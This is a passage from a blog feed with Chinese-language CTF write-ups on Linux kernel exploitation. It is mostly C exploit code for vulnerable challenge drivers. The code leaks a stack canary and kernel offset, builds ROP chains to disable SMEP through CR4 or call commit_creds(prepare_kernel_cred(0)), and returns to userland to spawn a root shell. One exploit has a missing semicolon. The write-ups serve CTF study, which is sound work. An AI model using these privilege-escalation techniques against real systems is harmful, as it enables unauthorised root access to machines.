operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span>uint64_t cred<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xffffffff810b99d0</span><span class="token punctuation">;</span><span class="token function">uint64_t</span> <span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span>uint64_t cred<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xffffffff810b9d80</span><span class="token punctuation">;</span>uint64_t pop_rdi_ret <span class="token operator">=</span> <span class="token number">0xffffffff8100631d</span><span class="token punctuation">;</span>uint64_t mov_cr4_rdi_pop_rbp_ret <span class="token operator">=</span> <span class="token number">0xffffffff81020300</span><span class="token punctuation">;</span>size_t user_cs<span class="token punctuation">,</span> user_ss<span class="token punctuation">,</span> user_eflags<span class="token punctuation">,</span> user_sp<span class="token punctuation">;</span><span class="token keyword">struct</span> trap_frame<span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token operator">*</span>rip<span class="token punctuation">;</span>    uint64_t cs<span class="token punctuation">;</span>    uint64_t rflags<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span> rsp<span class="token punctuation">;</span>    uint64_t ss<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>packed<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">struct</span> trap_frame tf<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">launch_shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">execl</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"sh"</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">commit_creds</span><span class="token punctuation">(</span><span class="token function">prepare_kernel_cred</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movq $tf, %rsp\n"</span>        <span class="token string">"swapgs\n"</span>        <span class="token string">"iretq\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">launch_shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">save_status</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token keyword">asm</span><span class="token punctuation">(</span>       <span class="token string">" mov %%cs, %0\n"</span>       <span class="token string">"mov %%ss,%1\n"</span>       <span class="token string">"mov %%rsp,%3\n"</span>       <span class="token string">"pushfq\n"</span>       <span class="token string">"popq %2"</span>       <span class="token punctuation">:</span><span class="token string">"=r"</span><span class="token punctuation">(</span>tf<span class="token punctuation">.</span>cs<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"=r"</span><span class="token punctuation">(</span>tf<span class="token punctuation">.</span>ss<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"=r"</span><span class="token punctuation">(</span>tf<span class="token punctuation">.</span>rflags<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"=r"</span><span class="token punctuation">(</span>tf<span class="token punctuation">.</span>rsp<span class="token punctuation">)</span>       <span class="token punctuation">:</span>       <span class="token punctuation">:</span><span class="token string">"memory"</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    tf<span class="token punctuation">.</span>rsp <span class="token operator">-</span><span class="token operator">=</span> <span class="token number">4096</span><span class="token punctuation">;</span>    tf<span class="token punctuation">.</span>rip <span class="token operator">=</span> <span class="token operator">&amp;</span>launch_shell<span class="token punctuation">;</span><span class="token punctuation">}</span>uint64_t <span class="token function">u64</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> s<span class="token punctuation">)</span><span class="token punctuation">{</span>    uint64_t result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">7</span> <span class="token punctuation">;</span> i <span class="token operator">>=</span><span class="token number">0</span> <span class="token punctuation">;</span>i<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        result <span class="token operator">=</span> <span class="token punctuation">(</span>result <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token number">0x00000000000000ff</span><span class="token operator">&amp;</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">writeFunc</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>buffer<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x6001</span><span class="token punctuation">,</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"success write to kernel buffer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">readFunc</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>buffer<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x6002</span><span class="token punctuation">,</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"success read from kernel buffer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">save_status</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/baby"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">0x200</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>fd<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">readFunc</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>buffer<span class="token punctuation">,</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    uint64_t no_addr <span class="token operator">=</span> <span class="token number">0xffffffff812b8cc8</span><span class="token punctuation">;</span>    uint64_t addr <span class="token operator">=</span> <span class="token function">u64</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buffer<span class="token punctuation">[</span><span class="token number">0x90</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    uint64_t canary <span class="token operator">=</span> <span class="token function">u64</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buffer<span class="token punctuation">[</span><span class="token number">0x80</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    uint64_t offset <span class="token operator">=</span> addr <span class="token operator">-</span> no_addr<span class="token punctuation">;</span>    commit_creds <span class="token operator">=</span> commit_creds <span class="token operator">+</span> offset<span class="token punctuation">;</span>    prepare_kernel_cred <span class="token operator">=</span> prepare_kernel_cred <span class="token operator">+</span> offset<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] offset is : %p\n"</span><span class="token punctuation">,</span>offset<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] canary is : %p\n"</span><span class="token punctuation">,</span>canary<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>buffer<span class="token operator">+</span><span class="token number">0x80</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> canary<span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>buffer<span class="token operator">+</span><span class="token number">0x88</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>buffer<span class="token operator">+</span><span class="token number">0x90</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> offset<span class="token operator">+</span>pop_rdi_ret<span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>buffer<span class="token operator">+</span><span class="token number">0x98</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x6f0</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>buffer<span class="token operator">+</span><span class="token number">0xa0</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> offset<span class="token operator">+</span>mov_cr4_rdi_pop_rbp_ret<span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>buffer<span class="token operator">+</span><span class="token number">0xa8</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>buffer<span class="token operator">+</span><span class="token number">0xb0</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> payload<span class="token punctuation">;</span>    <span class="token function">writeFunc</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> kernel从0到-1系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel-ROP </tag>
            
            <tag> kernel-canary </tag>
            
            <tag> kernel-smep </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019-xman-入营-kernel</title>
      <link href="/2020/07/24/2019-xman-ru-ying-kernel/"/>
      <url>/2020/07/24/2019-xman-ru-ying-kernel/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h1><p>这是一道2019 xman入营赛题，当时完全不会kernel的内容，所以直接就放弃了。<br><a href="https://pan.baidu.com/s/11-wEnopPssfLqkWTzQO0NQ" target="_blank" rel="noopener">题目链接</a><br>提取码：uckj</p><h1 id="1-查看文件"><a href="#1-查看文件" class="headerlink" title="1.查看文件"></a>1.查看文件</h1><div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/24/2019-xman-ru-ying-kernel/0.png"></div><div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/24/2019-xman-ru-ying-kernel/1.png"></div><div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/24/2019-xman-ru-ying-kernel/2.png"></div>没有canary保护，开启了smep保护机制<h1 id="2-IDA分析"><a href="#2-IDA分析" class="headerlink" title="2.IDA分析"></a>2.IDA分析</h1><p>调用write函数就可以向kernel stack写入数据</p><div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/24/2019-xman-ru-ying-kernel/3.png"></div><div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/24/2019-xman-ru-ying-kernel/4.png"></div>数据的size没有限制，就直接可以栈溢出了<h1 id="3-思路"><a href="#3-思路" class="headerlink" title="3.思路"></a>3.思路</h1><p>栈溢出，写rop，绕过smep用户态执行payload</p><p>提供两个绕过smep的方法：<br><strong>第一个方法</strong>：直接栈溢出执行commit_creds(prepare_kernel_cred(0))进行提权，只不过找指令什么的比较繁琐<br><strong>第二个方法</strong>：通过修改cr4寄存器来关闭smep（系统根据 CR4 寄存器的值判断是否开启 smep 保护，当 CR4 寄存器的第 20 位是 1 时，保护开启；是 0 时，保护关闭。CR4 寄存器是可以通过 mov 指令修改的，一般修改为0x6f0）</p><p>这里使用第一个方法：</p><h1 id="4-exp"><a href="#4-exp" class="headerlink" title="4.exp"></a>4.exp</h1><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span><span class="token comment" spellcheck="true">// 0xffffffff810779b0 prepare_kernel_cred</span><span class="token comment" spellcheck="true">// 0xffffffff81077620 commit_creds</span><span class="token comment" spellcheck="true">//0xffffffff811b771d : pop rdi ; ret</span><span class="token comment" spellcheck="true">//0xffffffff8122f802 : pop rdx ; ret</span><span class="token comment" spellcheck="true">//0xffffffff810aa626 : mov rdi, rax ; call rdx</span><span class="token comment" spellcheck="true">//0xffffffff813345db : swapgs ; pop rbp ; ret</span><span class="token comment" spellcheck="true">//0xffffffff818e8977:    48 cf                    iretq</span>size_t user_cs<span class="token punctuation">,</span> user_ss<span class="token punctuation">,</span> user_eflags<span class="token punctuation">,</span> user_sp<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">save_stats</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">asm</span><span class="token punctuation">(</span>    <span class="token string">"movq %%cs, %0\n"</span>    <span class="token string">"movq %%ss, %1\n"</span>    <span class="token string">"movq %%rsp, %3\n"</span>    <span class="token string">"pushfq\n"</span>    <span class="token string">"popq %2\n"</span>    <span class="token punctuation">:</span><span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_eflags<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"=r"</span><span class="token punctuation">(</span>user_sp<span class="token punctuation">)</span>    <span class="token punctuation">:</span>    <span class="token punctuation">:</span> <span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> rop<span class="token punctuation">[</span><span class="token number">0x200</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">save_stats</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/mychrdev"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"open fail!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    rop<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161UL</span><span class="token punctuation">;</span>    rop<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">0x6161616161616161UL</span><span class="token punctuation">;</span>    rop<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">0x6161616161616161UL</span><span class="token punctuation">;</span>    rop<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">0x6161616161616161UL</span><span class="token punctuation">;</span>    rop<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">0x6161616161616161UL</span><span class="token punctuation">;</span>    rop<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">0x6161616161616161UL</span><span class="token punctuation">;</span>    rop<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">0x6161616161616161UL</span><span class="token punctuation">;</span>    rop<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">0x6161616161616161UL</span><span class="token punctuation">;</span>    rop<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">0x6161616161616161UL</span><span class="token punctuation">;</span>    rop<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">0x6161616161616161UL</span><span class="token punctuation">;</span>    rop<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">0x6161616161616161UL</span><span class="token punctuation">;</span>    rop<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">0xffffffff811b771dUL</span><span class="token punctuation">;</span>    rop<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">0x0UL</span><span class="token punctuation">;</span>    rop<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span><span class="token number">0xffffffff810779b0UL</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//preare_kernel_cred</span>    rop<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span><span class="token number">0xffffffff8122f802UL</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//pop rdx;ret</span>    rop<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">0xffffffff81077621UL</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//commit_creds</span>    rop<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span><span class="token number">0xffffffff810aa626UL</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//mov rdi,rax;  call rdx</span>    rop<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">0xffffffff813345dbUL</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// swapgs; pop rbp; ret</span>    rop<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">0xdeadbeefUL</span><span class="token punctuation">;</span>    rop<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">0xffffffff818e8977UL</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// iretq</span>    rop<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> shell<span class="token punctuation">;</span>    rop<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> user_cs<span class="token punctuation">;</span>    rop<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> user_eflags<span class="token punctuation">;</span>    rop<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> user_sp    rop<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> user_ss<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>rop<span class="token punctuation">,</span><span class="token number">0x128</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"No!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> kernel从0到-1系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel-ROP </tag>
            
            <tag> kernel-smep </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISN2017-babydriver</title>
      <link href="/2020/07/24/cisn2017-babydriver/"/>
      <url>/2020/07/24/cisn2017-babydriver/</url>
      
